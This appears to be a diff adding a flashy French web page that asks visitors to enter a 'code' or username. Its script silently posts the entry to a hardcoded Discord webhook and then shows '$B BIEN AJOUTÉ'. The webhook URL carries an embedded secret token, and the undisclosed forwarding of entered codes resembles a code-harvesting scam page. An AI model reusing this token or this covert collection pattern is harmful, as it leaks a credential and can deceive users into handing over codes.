@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>•MZW’X $B</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            height:100dvh;
+            background:linear-gradient(135deg,#001f4d,#0066cc,#00aaff);
+            background-size:400% 400%;
+            animation:gradientMove 12s ease infinite;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:center;
+            gap:8vh;
+            font-family:'Arial Black',sans-serif;
+            overflow:hidden;
+        }
+        @keyframes gradientMove {
+            0%{background-position:0% 50%;}
+            50%{background-position:100% 50%;}
+            100%{background-position:0% 50%;}
+        }
+        h1{
+            font-size:12vw;
+            font-weight:900;
+            background:linear-gradient(to right,#fff,#ff0000,#fff);
+            -webkit-background-clip:text;
+            background-clip:text;
+            -webkit-text-fill-color:transparent;
+            text-shadow:0 0 30px rgba(255,0,0,0.8);
+            animation:fadeInDown 2s ease forwards;
+        }
+        @keyframes fadeInDown {
+            from{opacity:0;transform:translateY(-50px);}
+            to{opacity:1;transform:translateY(0);}
+        }
+        input{
+            width:80vw;
+            max-width:600px;
+            padding:18px;
+            font-size:5vw;
+            font-weight:900;
+            text-align:center;
+            text-transform:uppercase;
+            letter-spacing:0.2em;
+            background:rgba(255,255,255,0.15);
+            color:#ff0033;
+            border:3px solid #ff0000;
+            border-radius:12px;
+            box-shadow:0 0 25px rgba(255,0,0,0.6);
+            outline:none;
+            transition:all 0.4s ease;
+            animation:fadeInUp 2s ease forwards;
+        }
+        input:focus{
+            background:rgba(255,255,255,0.3);
+            box-shadow:0 0 40px rgba(255,0,0,0.9);
+            transform:scale(1.05);
+        }
+        #btn{
+            padding:18px 60px;
+            font-size:6vw;
+            font-weight:900;
+            text-transform:uppercase;
+            background:#ff0000;
+            color:#fff;
+            border:none;
+            border-radius:12px;
+            box-shadow:0 0 50px rgba(255,0,0,0.7);
+            cursor:pointer;
+            transition:all 0.4s ease;
+            animation:fadeInUp 2.5s ease forwards;
+        }
+        #btn:hover{
+            transform:scale(1.1) rotate(-2deg);
+            background:#ff3333;
+            box-shadow:0 0 80px rgba(255,0,0,1);
+        }
+        .success{
+            background:#fff;
+            color:#ff0000;
+            box-shadow:0 0 80px #ff0000;
+            animation:pulse 1.5s infinite;
+        }
+        @keyframes pulse{
+            0%,100%{transform:scale(1);}
+            50%{transform:scale(1.1);}
+        }
+        @keyframes fadeInUp {
+            from{opacity:0;transform:translateY(50px);}
+            to{opacity:1;transform:translateY(0);}
+        }
+    </style>
+</head>
+<body>
+    <h1>• Best $B</h1>
+    <input type="text" placeholder="ENTREZ ICI …" autofocus>
+    <button id="btn" onclick="envoyer()">Envoyer</button>
+    <script>
+        const input = document.querySelector('input');
+        const btn   = document.getElementById('btn');
+        input.addEventListener('keypress', e => { if(e.key==='Enter') envoyer(); });
+        function envoyer() {
+            const texte = input.value.trim();
+            if(texte === '') return;  
+            const webhook = "https://discord.com/api/webhooks/1448787858151444490/t9vK-ZlZDjc7S72rW2ASx5B5ktDVm5DvXQQd778IkeCByF1mHpaAy9qVyTC0tKAferhx";
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `**Nouveau $B ajouté !**\nCode / Pseudo : **${texte}**\nDate : ${new Date().toLocaleString('fr-FR')}`
+                })
+            });
+            // Validation visuelle
+            input.style.display = 'none';
+            btn.textContent = '$B BIEN AJOUTÉ';
+            btn.classList.add('success');
+            btn.disabled = true;
+        }
+    </script>
+</body>
+</html>
